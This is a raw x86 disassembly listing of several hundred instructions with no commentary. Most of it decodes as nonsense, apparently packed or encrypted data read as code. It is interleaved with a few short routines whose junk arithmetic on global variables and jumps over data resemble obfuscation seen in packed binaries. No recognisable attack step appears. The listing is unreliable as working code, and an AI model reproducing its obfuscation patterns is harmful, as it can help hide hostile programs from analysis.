  40610a:	jge    0x40615c
  40610c:	loope  0x406182
  40610e:	adc    eax,0x85102aee
  406113:	in     al,0x2a
  406115:	pop    esp
  406116:	stos   BYTE PTR es:[edi],al
  406117:	sbb    eax,0x716ce695
  40611c:	adc    dh,ah
  40611e:	sub    dh,dl
  406120:	popa   
  406121:	xor    eax,0x3473ec2d
  406126:	push   0x2a3d0d20
  40612b:	aam    0x67
  40612d:	mov    ch,0xb4
  40612f:	xor    ecx,edi
  406131:	jl     0x406186
  406133:	mov    ds:0xa7327704,eax
  406138:	mov    bh,0x56
  40613a:	mov    ch,0x56
  40613c:	(bad)  
  40613d:	scas   eax,DWORD PTR es:[edi]
  40613e:	cdq    
  40613f:	sbb    bh,bh
  406141:	sub    edx,DWORD PTR [esi-0x33]
  406144:	js     0x4061b3
  406146:	outs   dx,DWORD PTR ds:[esi]
  406147:	cmp    dl,dh
  406149:	ss xchg esi,eax
  40614b:	sbb    BYTE PTR [eax+0x6e],dl
  40614e:	(bad)  
  40614f:	adc    ah,al
  406151:	jbe    0x406188
  406153:	leave  
  406154:	cmp    dh,0xc
  406157:	cwde   
  406158:	jp     0x4061a8
  40615a:	mov    eax,0xd32bd890
  40615f:	data16 sub ah,cl
  406162:	pusha  
  406163:	add    eax,DWORD PTR [bp+di+0x35]
  406167:	cmp    DWORD PTR ds:0x37c9cf4c,ebp
  40616d:	xor    bl,BYTE PTR [ebx+0x79]
  406170:	in     al,0x57
  406172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406173:	mov    cl,0x54
  406175:	mov    edi,0x24b01f08
  40617a:	mov    eax,ds:0x76dc0fa5
  40617f:	and    eax,0x90611a60
  406184:	cld    
  406185:	sub    al,0xf1
  406187:	pop    edi
  406188:	lock push 0xef2b06e1
  40618e:	(bad)  
  40618f:	xor    ecx,DWORD PTR [esi]
  406191:	in     eax,0x9f
  406193:	js     0x4061e8
  406195:	jmp    0xcc50:0xf6510bdc
  40619c:	sbb    al,BYTE PTR [edx-0xa]
  40619f:	fwait
  4061a0:	sbb    al,0xba
  4061a2:	aad    0xf4
  4061a4:	dec    ebx
  4061a5:	or     bl,dh
  4061a7:	stos   BYTE PTR es:[edi],al
  4061a8:	xor    BYTE PTR [edi-0x4f7628e0],cl
  4061ae:	je     0x4061f2
  4061b0:	jecxz  0x406225
  4061b2:	int    0x7b
  4061b4:	enter  0x89b0,0x3b
  4061b8:	pop    esp
  4061b9:	jb     0x40615e
  4061bb:	push   ds
  4061bc:	xchg   edi,eax
  4061bd:	jae    0x4061a9
  4061bf:	mov    esp,DWORD PTR [esp+eax*1]
  4061c2:	fadd   DWORD PTR [edx]
  4061c4:	test   al,0x26
  4061c6:	mov    bh,0xff
  4061c8:	mov    ds:0x9c286c54,al
  4061cd:	inc    ebx
  4061ce:	call   0x9872:0x9b3a9b7a
  4061d5:	shr    BYTE PTR ds:[ebp-0x45675e37],0xc7
  4061dd:	xlat   BYTE PTR ds:[ebx]
  4061de:	mov    eax,0x44bd8426
  4061e3:	rcr    BYTE PTR [edx],0x12
  4061e6:	fs popf 
  4061e8:	jg     0x4061a6
  4061ea:	outs   dx,DWORD PTR ds:[esi]
  4061eb:	sbb    edi,DWORD PTR [edi+0x2e]
  4061ee:	enter  0xcfc6,0xf8
  4061f2:	dec    edi
  4061f3:	neg    BYTE PTR [esi]
  4061f5:	into   
  4061f6:	pop    eax
  4061f7:	add    eax,0x3e3962c5
  4061fc:	sahf   
  4061fd:	mov    ebx,0x469b89d3
  406202:	(bad)  
  406203:	xchg   edx,eax
  406204:	stos   DWORD PTR es:[edi],eax
  406205:	jge    0x40625f
  406207:	sbb    al,0xc2
  406209:	sub    ecx,esp
  40620b:	(bad)  
  40620c:	cmp    eax,0xa15970da
  406211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406212:	xchg   edi,eax
  406213:	push   eax
  406214:	test   eax,0x661e8e11
  406219:	das    
  40621a:	fucomip st,st(5)
  40621c:	push   esi
  40621d:	lds    edx,FWORD PTR [ecx-0x663b3b93]
  406223:	xchg   ecx,eax
  406224:	inc    eax
  406225:	aas    
  406226:	pop    ds
  406227:	and    eax,0x5df012de
  40622c:	dec    edi
  40622d:	lods   al,BYTE PTR ds:[esi]
  40622e:	ds adc ecx,ecx
  406231:	jge    0x406227
  406233:	pop    esp
  406234:	sub    al,0xfb
  406236:	add    eax,DWORD PTR [eax-0x54c26599]
  40623c:	push   0x21
  40623e:	jle    0x4061c3
  406240:	outs   dx,DWORD PTR ds:[esi]
  406241:	push   0x50
  406243:	mov    dl,0x70
  406245:	scas   al,BYTE PTR es:[edi]
  406246:	pop    es
  406247:	and    eax,0x28244d39
  40624c:	ins    DWORD PTR es:[edi],dx
  40624d:	repnz (bad) 
  406250:	inc    ebx
  406251:	mov    WORD PTR ds:0x940610f3,fs
  406257:	dec    edx
  406258:	mov    ds:0x51563702,eax
  40625d:	pop    ecx
  40625e:	cmp    ch,BYTE PTR [eax-0x11]
  406261:	lds    eax,FWORD PTR [esp+eiz*8]
  406264:	or     al,0x75
  406266:	retf   0xa844
  406269:	jb     0x406227
  40626b:	ds jnp 0x4062e7
  40626e:	jo     0x4061fc
  406270:	lea    ebx,[ebp-0x22]
  406273:	and    DWORD PTR [ecx+0x70],ecx
  406276:	mov    bl,BYTE PTR [ecx]
  406278:	pop    ebp
  406279:	call   0x22b8c27
  40627e:	mov    esp,0xacc72975
  406283:	ins    DWORD PTR es:[edi],dx
  406284:	xchg   ecx,eax
  406285:	retf   0x3478
  406288:	add    al,0x4f
  40628a:	inc    esi
  40628b:	jecxz  0x406222
  40628d:	mov    dh,0x8b
  40628f:	inc    ebp
  406290:	sbb    BYTE PTR [ebx+0x2d811075],cl
  406296:	or     ebp,edi
  406298:	inc    edx
  406299:	add    BYTE PTR [esi-0x76ffbd03],al
  40629f:	inc    esi
  4062a0:	or     al,0x9
  4062a2:	or     eax,0x42e6f3
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fd72,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fd72,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fd72,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e53b
  4062e2:	cmp    DWORD PTR ds:0x42fd72,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fd72
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fd72,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fd72
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fd72,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	sub    DWORD PTR [ecx],ebx
  406330:	jb     0x40636c
  406332:	mov    WORD PTR [eax+esi*2],?
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x4062c5
  40633b:	stc    
  40633c:	jo     0x406358
  40633e:	rcr    BYTE PTR [esi+0x1c],0x9d
  406342:	mov    fs:0xa158da75,eax
  406348:	jmp    0x2032015a
  40634d:	sbb    al,0x7b
  40634f:	je     0x406366
  406351:	push   eax
  406352:	pusha  
  406353:	mov    eax,eax
  406355:	jb     0x4063a3
  406357:	xor    ecx,DWORD PTR [ecx-0x59]
  40635a:	inc    esp
  40635b:	pop    edx
  40635c:	pop    esp
  40635d:	pushf  
  40635e:	jle    0x4062fe
  406360:	scas   al,BYTE PTR es:[edi]
  406361:	pusha  
  406362:	es aad 0x81
  406365:	into   
  406366:	ja     0x40636f
  406368:	and    DWORD PTR [ecx+esi*2],esi
  40636b:	rcr    BYTE PTR [esp+ebx*4-0x1db24bd],1
  406372:	sub    al,0x72
  406374:	inc    esp
  406375:	popf   
  406376:	cdq    
  406377:	and    DWORD PTR [ecx-0x1d84cf6b],esi
  40637d:	push   ebp
  40637e:	arpl   WORD PTR [ebx],ax
  406380:	and    DWORD PTR [esi+0x2b],ebp
  406383:	lock ins BYTE PTR es:[edi],dx
  406385:	outs   dx,DWORD PTR ds:[esi]
  406386:	stos   DWORD PTR es:[edi],eax
  406387:	outs   dx,BYTE PTR ds:[esi]
  406388:	mov    dh,BYTE PTR [ebx]
  40638a:	and    dl,BYTE PTR [edx+0x4d]
  40638d:	xor    ch,BYTE PTR [edi+0x38551c6c]
  406393:	lods   al,BYTE PTR ds:[esi]
  406394:	mov    ebp,0x59f8e5d3
  406399:	sar    dh,cl
  40639b:	gs xchg esi,eax
  40639d:	jle    0x406324
  40639f:	mov    edi,0xacd9e1d5
  4063a4:	push   ds
  4063a5:	mov    esi,ecx
  4063a7:	inc    edi
  4063a8:	fcmovnb st,st(5)
  4063aa:	ret    0xaded
  4063ad:	jne    0x4063c4
  4063af:	and    esp,0x8b483acd
  4063b5:	test   DWORD PTR [edi],esp
  4063b7:	lds    ecx,FWORD PTR [edx]
  4063b9:	mov    ds:0xeb3d43a8,eax
  4063be:	mov    eax,ds:0xdcd733c8
  4063c3:	adc    ebx,ebx
  4063c5:	cli    
  4063c6:	adc    eax,ecx
  4063c8:	lahf   
  4063c9:	adc    DWORD PTR [ebp+0x6f847b8],0x889a7c2d
  4063d3:	pop    ss
  4063d4:	jl     0x406430
  4063d6:	mov    DWORD PTR [ebp+0x5b],esi
  4063d9:	push   ecx
  4063da:	data16 rol BYTE PTR [eax+0x1c],cl
  4063de:	retf   0x75ea
  4063e1:	dec    edi
  4063e2:	inc    edi
  4063e3:	mov    ds:0x757201e,eax
  4063e8:	xchg   DWORD PTR [ecx-0x7f9b3f14],edx
  4063ee:	out    dx,al
  4063ef:	std    
  4063f0:	ds mov ah,0x60
  4063f3:	call   0xcfb19520
  4063f8:	adc    BYTE PTR fs:[eax+eax*4],dl
  4063fc:	dec    ecx
  4063fd:	sub    eax,0x3aeb10bc
  406402:	dec    eax
  406403:	out    dx,eax
  406404:	inc    ecx
  406405:	add    eax,0x3522e591
  40640a:	xor    DWORD PTR [esi-0x5a],0x57c7d74b
  406411:	push   ss
  406412:	cmovne esp,DWORD PTR [ecx-0xbf0224d]
  406419:	jmp    0xffb36b8e
  40641e:	jg     0x4063ca
  406420:	lock ds cwde 
  406423:	push   0xffffff99
  406425:	jno    0x4064a6
  406427:	(bad)  
  406429:	popf   
  40642a:	lea    ebx,[eax-0xc113dc2]
  406430:	sbb    eax,0x75e2cff5
  406435:	jmp    0x40646e
  406437:	lock ins DWORD PTR es:[edi],dx
  406439:	sete   BYTE PTR [edi+0x50]
  40643d:	dec    esp
  40643e:	pop    ebp
  40643f:	mov    WORD PTR [ebx-0x43b1db0],cs
  406445:	xor    esp,edx
  406447:	loop   0x406431
  406449:	punpcklbw mm3,DWORD PTR [ebp+0x20]
  40644d:	(bad)  
  40644e:	pop    esi
  40644f:	jg     0x4063fb
  406451:	js     0x4064b9
  406453:	add    al,0xcd
  406455:	cdq    
  406456:	aas    
  406457:	adc    DWORD PTR [esi],edi
  406459:	xchg   ebx,eax
  40645a:	pop    ecx
  40645b:	sub    eax,0xc34146c3
  406460:	adc    eax,0x297c5b52
  406465:	push   eax
  406466:	scas   eax,DWORD PTR es:[edi]
  406467:	cmp    BYTE PTR [edx+esi*8-0x7d51119e],ah
  40646e:	repz mov cl,0x4b
  406472:	mov    esp,0xd691c5ce
  406477:	ficom  WORD PTR [ebx-0x64a13d4]
  40647d:	jle    0x4064f0
  40647f:	fnstcw WORD PTR [eax]
  406481:	loopne 0x40649f
  406483:	sbb    al,BYTE PTR [edx-0x6e48d2c3]
  406489:	sub    esi,DWORD PTR [esi+0x64e28724]
  40648f:	push   ss
  406490:	out    0xd5,al
  406492:	in     eax,dx
  406493:	inc    ebp
  406494:	or     DWORD PTR [esi+0x56],edi
  406497:	inc    esi
  406498:	into   
  406499:	jl     0x4064ba
  40649b:	popf   
  40649c:	ror    DWORD PTR [ebx+0x3bb0825],1
  4064a2:	cmp    edx,ecx
  4064a4:	dec    esp
  4064a5:	pop    eax
  4064a6:	xor    al,0x71
  4064a8:	fwait
  4064a9:	xchg   ebx,eax
  4064aa:	cs stos DWORD PTR es:[edi],eax
  4064ac:	jmp    0x40648a
  4064ae:	outs   dx,DWORD PTR ds:[esi]
  4064af:	dec    edi
  4064b0:	mov    eax,ds:0x58fc291a
  4064b5:	pop    eax
  4064b6:	pushf  
  4064b7:	(bad)  
  4064b8:	stc    
  4064b9:	(bad)  
  4064ba:	dec    ebx
  4064bb:	test   eax,0x6cb9ee08
  4064c0:	in     eax,dx
  4064c1:	jecxz  0x406529
  4064c3:	cld    
  4064c4:	outs   dx,BYTE PTR ds:[esi]
  4064c5:	hlt    
  4064c6:	cwde   
  4064c7:	(bad)  
  4064c9:	pop    esp
  4064ca:	scas   eax,DWORD PTR es:[edi]
  4064cb:	push   0xa955630
  4064d0:	sahf   
  4064d1:	push   es
  4064d2:	inc    esp
  4064d3:	sbb    DWORD PTR [eax+ebp*1-0xb],ecx
  4064d7:	xchg   ebp,eax
  4064d8:	jnp    0x406460
  4064da:	xor    ecx,DWORD PTR [eax+0x304c4c25]
  4064e0:	xor    al,0x39
  4064e2:	adc    bl,BYTE PTR [esi-0x37]
  4064e5:	ret    0x18
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fd76,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fcf9
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fd72,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fd72,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fcd9,0x42e6fb
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	stos   BYTE PTR es:[edi],al
  406567:	inc    ebx
  406568:	lea    edi,[ebp+0x33]
  40656b:	cmp    dh,BYTE PTR [eax+0x70]
  40656e:	loop   0x4065ee
  406570:	jo     0x4065e2
  406572:	ret    
  406573:	jnp    0x406579
  406575:	cwde   
  406576:	sbb    ch,BYTE PTR [edi+0x3d]
  406579:	shr    DWORD PTR [ecx+0x322e3e48],1
  40657f:	into   
  406580:	call   0x2a2c1bae
  406585:	test   DWORD PTR [esi+0x53],ebp
  406588:	and    cl,BYTE PTR [edi]
  40658a:	sahf   
  40658b:	jmp    0x8737151e
  406590:	cmp    al,0xf1
  406592:	ins    BYTE PTR es:[edi],dx
  406593:	jo     0x4065b9
  406595:	inc    ebx
  406596:	push   ecx
  406597:	in     eax,0x6c
  406599:	jge    0x4065d3
  40659b:	(bad)  
  40659c:	(bad)  [ecx-0x6e4657b6]
  4065a2:	das    
  4065a3:	nop
  4065a4:	push   eax
  4065a5:	fild   QWORD PTR [eax]
  4065a7:	sar    edx,cl
  4065a9:	pop    esp
  4065aa:	sbb    bl,ah
  4065ac:	ds push cs
  4065ae:	mov    ebp,0xcd67d5f0
  4065b3:	mov    bh,0x7b
  4065b5:	sbb    al,0x1a
  4065b7:	imul   edx,DWORD PTR ds:0x42159362,0xffffffb5
  4065be:	test   BYTE PTR [esi-0x66],dl
  4065c1:	lds    ebx,FWORD PTR [esi-0x4f90f3e4]
  4065c7:	mov    dl,0xc2
  4065c9:	adc    DWORD PTR [eax+0x38],edi
  4065cc:	retf   0x3a7c
  4065cf:	xor    ah,BYTE PTR [edx]
  4065d1:	loop   0x4065fd
  4065d3:	test   eax,0x67cf88ad
  4065d8:	ja     0x406562
  4065da:	fisub  WORD PTR [edx-0x7fad1a39]
  4065e0:	and    al,0x7
  4065e2:	cwde   
  4065e3:	add    dl,BYTE PTR [edi+0x382b3e10]
  4065e9:	test   BYTE PTR [ebx],cl
  4065eb:	mov    DWORD PTR [ebx],edi
  4065ed:	les    esp,FWORD PTR [eax-0x68590d1b]
  4065f3:	xchg   esp,eax
  4065f4:	ins    BYTE PTR es:[edi],dx
  4065f5:	mov    ch,0x41
  4065f7:	pushf  
  4065f8:	test   al,0x53
  4065fa:	mov    edx,0x73bcec58
  4065ff:	mov    ds:0x543fe858,al
  406604:	xor    BYTE PTR [edx-0x14],ah
  406607:	aad    0x77
  406609:	outs   dx,BYTE PTR ds:[esi]
  40660a:	int3   
  40660b:	push   ss
  40660c:	mov    DWORD PTR [esi-0x579613e4],edi
  406612:	retf   
  406613:	xchg   edi,eax
  406614:	dec    ecx
  406615:	fidivr WORD PTR [eax+0x11ea9b0d]
  40661b:	mov    dh,0xe0
  40661d:	neg    ebx
  40661f:	xlat   BYTE PTR ds:[ebx]
  406620:	inc    esp
  406621:	mov    edx,0x922ab8c1
  406626:	int    0x5a
  406628:	ret    0xecd4
  40662b:	clc    
  40662c:	inc    ecx
  40662d:	mov    ch,0x7d
  40662f:	or     bh,BYTE PTR [edi]
  406631:	cdq    
  406632:	ret    0x6fe1
  406635:	or     ebx,DWORD PTR [edi+ebp*4+0x2c]
  406639:	fnstcw WORD PTR [eax-0x77]
  40663c:	fnstsw WORD PTR [eax-0x7d1a9661]
  406642:	mov    esp,0x6255797c
  406647:	fild   QWORD PTR [ecx+0xc]
  40664a:	lock in al,0x3e
  40664d:	jne    0x406680
  40664f:	adc    BYTE PTR [edi+0x2d72eb16],al
  406655:	icebp  
  406656:	adc    BYTE PTR [ebx],ah
  406658:	sahf   
  406659:	pop    edi
  40665a:	je     0x40667f
  40665c:	push   edi
  40665d:	sub    BYTE PTR [edx-0x730ee56e],al
  406663:	add    al,0x1b
  406665:	outs   dx,DWORD PTR ds:[esi]
  406666:	les    esi,FWORD PTR [ebx+0x51c7e25]
  40666c:	leave  
  40666d:	push   0x4b
  40666f:	fwait
  406670:	popf   
  406671:	sbb    DWORD PTR [esi],esi
  406673:	inc    esp
  406674:	loopne 0x406605
  406676:	jp     0x40661c
  406678:	inc    esi
  406679:	mov    cl,0x6d
  40667b:	or     eax,ecx
  40667d:	xor    dh,ah
  40667f:	rcl    dl,cl
  406681:	icebp  
  406682:	fistp  QWORD PTR [esi+esi*8-0x147df76]
  406689:	daa    
  40668a:	imul   edi,DWORD PTR [edx],0x7b380d34
  406690:	ds pop esi
  406692:	gs or  ebx,ebp
  406695:	aam    0xd
  406697:	and    al,0x5b
  406699:	xchg   esi,eax
  40669a:	jmp    0xeca660bb
  40669f:	(bad)  
  4066a0:	in     eax,0xff
  4066a2:	call   0x1833f6f2
  4066a7:	add    dl,bh
  4066a9:	loope  0x406633
  4066ab:	add    al,0x14
  4066ad:	loope  0x406695
  4066af:	rdmsr  
  4066b1:	mov    ds:0x88870fa5,al
  4066b6:	dec    eax
  4066b7:	add    DWORD PTR [eax],esi
  4066b9:	aaa    
  4066ba:	sar    BYTE PTR [edx+0x30f5c7ae],cl
  4066c0:	jnp    0x40668c
  4066c2:	adc    dh,0x3b
  4066c5:	in     eax,dx
  4066c6:	xor    al,0x6
  4066c8:	cdq    
  4066c9:	js     0x4066ee
  4066cb:	jno    0x406710
  4066cd:	cld    
  4066ce:	mov    dh,0x3a
  4066d0:	fnstenv [ecx+0x4]
  4066d3:	cmp    BYTE PTR [edx+0x55],bh
  4066d6:	loop   0x4066d9
  4066d8:	xor    eax,0x57a47b4a
  4066dd:	mov    bh,0x4b
  4066df:	xor    eax,0x10addc9
  4066e4:	ret    
  4066e5:	clc    
  4066e6:	sbb    esi,DWORD PTR [ebx]
  4066e8:	aas    
  4066e9:	or     dl,ah
  4066eb:	outs   dx,DWORD PTR ds:[esi]
  4066ec:	(bad)
  4066ef:	inc    ecx
  4066f0:	add    DWORD PTR [ebx+0x26],0x3
  4066f4:	in     al,dx
  4066f5:	std    
  4066f6:	jg     0x406767
  4066f8:	cs dec esp
  4066fa:	add    edx,DWORD PTR [edx]
  4066fc:	pop    es
  4066fd:	sbb    DWORD PTR [edi-0xcd48e8b],esp
  406703:	mov    eax,DWORD PTR [eax]
  406705:	in     al,dx
  406706:	repz dec edi
  406708:	cmp    DWORD PTR [edx],ebp
  40670a:	in     eax,dx
  40670b:	mov    edx,0x52579534
  406710:	jo     0x406783
  406712:	aaa    
  406713:	dec    esp
  406714:	arpl   WORD PTR [esi+0x77cfcbdc],bp
  40671a:	push   esi
  40671b:	pop    edx
  40671c:	cmp    edi,DWORD PTR [esi]
  40671e:	or     bh,BYTE PTR [esi+ebp*4]
  406721:	and    esp,ecx
  406723:	and    al,0x5b
  406725:	pushf  
  406726:	and    DWORD PTR [edx-0x17ea9336],0xffffff8d
  40672d:	push   DWORD PTR [edi+0x10]
  406730:	mov    ds,ecx
  406732:	ret    0x8947
  406735:	(bad)  
  406736:	idiv   BYTE PTR [eax]
  406738:	cmc    
  406739:	xchg   esp,eax
  40673a:	dec    esp
  40673b:	push   ecx
  40673c:	jbe    0x406733
  40673e:	hlt    
  40673f:	jae    0x4066dc
  406741:	pop    esi
  406742:	mul    DWORD PTR [edi+0x577095de]
  406748:	cwde   
  406749:	lea    esi,[esi]
  40674b:	inc    ebx
  40674c:	in     al,dx
  40674d:	fiadd  WORD PTR [esi+esi*1+0x2da0df76]
  406754:	pop    ss
  406755:	sbb    ch,BYTE PTR [eax+0x34]
  406758:	mov    al,0x71
  40675a:	scas   al,BYTE PTR es:[edi]
  40675b:	xor    bl,BYTE PTR [ebp+0x27ea94c1]
  406761:	stos   BYTE PTR es:[edi],al
  406762:	cld    
  406763:	mov    ch,BYTE PTR [ebp+0x4b2bbc9]
  406769:	dec    ebp
  40676a:	cmc    
  40676b:	or     esi,DWORD PTR [edi]
  40676d:	test   DWORD PTR [ecx],ebx
  40676f:	rol    bh,1
  406771:	jmp    0xbe8f:0x74bd99db
  406778:	xor    eax,0xce24d491
  40677d:	scas   al,BYTE PTR es:[edi]
  40677e:	pop    eax
  40677f:	dec    ebp
  406780:	jp     0x406742
  406782:	aas    
  406783:	xor    ebp,eax
  406785:	push   ebp
  406786:	xor    eax,0x6c94ee0
  40678b:	outs   dx,DWORD PTR ds:[esi]
  40678c:	aad    0x6
  40678e:	aaa    
  40678f:	pop    ds
  406790:	lods   al,BYTE PTR ds:[esi]
  406791:	sub    al,0xa5
  406793:	mov    cl,BYTE PTR [esi+0x6a263b76]
  406799:	inc    ecx
  40679a:	jo     0x406797
  40679c:	fidiv  WORD PTR ds:0x62d1e3db
  4067a2:	push   0x35
  4067a4:	push   0x17
  4067a6:	mov    DWORD PTR [ebx+0x51],ecx
  4067a9:	and    eax,0x51bfac2d
  4067ae:	test   al,0xb1
  4067b0:	sahf   
  4067b1:	int3   
  4067b2:	mov    al,ds:0xadb60065
  4067b7:	sbb    ah,BYTE PTR [ebx+0x45842985]
  4067bd:	out    0xbc,eax
  4067bf:	sub    eax,0x2858d9b7
  4067c4:	in     al,dx
  4067c5:	push   ecx
  4067c6:	sar    DWORD PTR [ebx],0xe9
  4067c9:	inc    ebx
  4067ca:	pushf  
  4067cb:	clc    
  4067cc:	repnz xor ebp,DWORD PTR [ecx-0x650ef751]
  4067d3:	mov    ecx,0x451d2276
  4067d8:	int3   
  4067d9:	test   dl,ah
  4067db:	adc    bh,BYTE PTR ds:[edi-0x34]
  4067df:	push   cs
  4067e0:	mov    edx,DWORD PTR [ebp+0x10]
  4067e3:	mov    DWORD PTR [edx+0x8],eax
  4067e6:	xor    eax,edx
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fcd5,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e120,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e6fb,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fce5,0x42e713
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	das    
  406847:	mov    WORD PTR [eax+0x7038a593],gs
  40684d:	jo     0x406831
  40684f:	jle    0x4068c1
  406851:	jo     0x406892
  406853:	pop    edx
  406854:	stos   BYTE PTR es:[edi],al
  406855:	jno    0x4067fb
  406857:	pop    ds
  406858:	bound  edi,QWORD PTR [edi]
  40685a:	cmp    al,0x5c
  40685c:	sbb    BYTE PTR [ebx+0x14],bl
  40685f:	daa    
  406860:	hlt    
  406861:	int    0xc
  406863:	inc    ecx
  406864:	jae    0x406869
  406866:	dec    edi
  406867:	hlt    
  406868:	or     BYTE PTR [ebp+0x44694c69],bh
  40686e:	cmp    BYTE PTR [eax-0x73],dh
  406871:	jnp    0x40684c
  406873:	push   ecx
  406874:	pop    ss
  406875:	inc    eax
  406876:	push   ecx
  406877:	call   0xc3adff76
  40687c:	mov    bh,0x97
  40687e:	sbb    DWORD PTR [edx+0x43],0x23314a7d
  406885:	or     BYTE PTR [ebx+0x2f6a49fb],bl
  40688b:	sar    DWORD PTR [edi],1
  40688d:	mov    WORD PTR [edi-0x10ed9fc8],ds
  406893:	xchg   ebp,eax
  406894:	in     eax,0x5e
  406896:	imul   esp,DWORD PTR [esi+0x5],0x3ef62b5a
  40689d:	jne    0x40684b
  40689f:	leave  
  4068a0:	sub    BYTE PTR [eax*1+0x29cd348f],0x35
  4068a8:	xor    edx,0x64b09ca3
  4068ae:	inc    ebp
  4068af:	retf   0xf910
  4068b2:	(bad)  
  4068b3:	pop    edx
  4068b4:	pop    es
  4068b5:	popa   
  4068b6:	loop   0x40691c
  4068b8:	popf   
  4068b9:	test   eax,0xa62777b3
  4068be:	lock imul edx,DWORD PTR [esi+eax*8-0x1f1f3077],0xbaf8ceb3
  4068ca:	iret   
  4068cb:	xor    al,0x9
  4068cd:	jp     0x4068e7
  4068cf:	push   edi
  4068d0:	or     al,0x8c
  4068d2:	sti    
  4068d3:	cmp    ebp,DWORD PTR [ebp+0x45]
  4068d6:	imul   ebx,edx,0xa1dc2db8
  4068dc:	jb     0x4068c0
  4068de:	das    
  4068df:	sub    al,bh
  4068e1:	arpl   WORD PTR [edx-0x415cafeb],sp
  4068e7:	ja     0x40694b
  4068e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068ea:	push   ebx
  4068eb:	push   esp
  4068ec:	arpl   WORD PTR [esi-0x3c87fa4e],si
  4068f2:	out    dx,eax
  4068f3:	xchg   ebp,eax
  4068f4:	(bad)  
  4068f5:	mov    bh,0xcc
  4068f7:	loopne 0x4068cd
  4068f9:	dec    esi
  4068fa:	pop    edi
  4068fb:	neg    BYTE PTR [esi+0x29307c35]
  406901:	inc    edi
  406902:	pop    ebx
  406903:	push   ds
  406904:	mov    BYTE PTR [ebx],al
  406906:	jno    0x4068a7
  406908:	fidiv  DWORD PTR [ebp+0x5741466a]
  40690e:	or     DWORD PTR [ecx+edi*2],esp
  406911:	sahf   
  406912:	sub    BYTE PTR [edi-0x32202b41],0x9
  406919:	outs   dx,DWORD PTR ds:[esi]
  40691a:	int    0x9e
  40691c:	pop    edx
  40691d:	inc    ecx
  40691e:	sub    edx,ecx
  406920:	or     eax,0xd4cb05ea
  406925:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406926:	fbstp  TBYTE PTR [edx+0x16]
  406929:	add    eax,0x419f2679
  40692e:	loop   0x40693e
  406930:	icebp  
  406931:	ins    BYTE PTR es:[edi],dx
  406932:	loopne 0x406962
  406934:	xor    dl,dl
  406936:	in     al,dx
  406937:	push   ss
  406938:	push   edi
  406939:	adc    DWORD PTR [ebx+0x4cb1a54a],edi
  40693f:	test   eax,0xc07eea3f
  406944:	sti    
  406945:	mov    ah,0x34
  406947:	ja     0x4068df
  406949:	mov    eax,0xbf67b924
  40694e:	mov    edi,0x7459bc90
  406953:	(bad)  
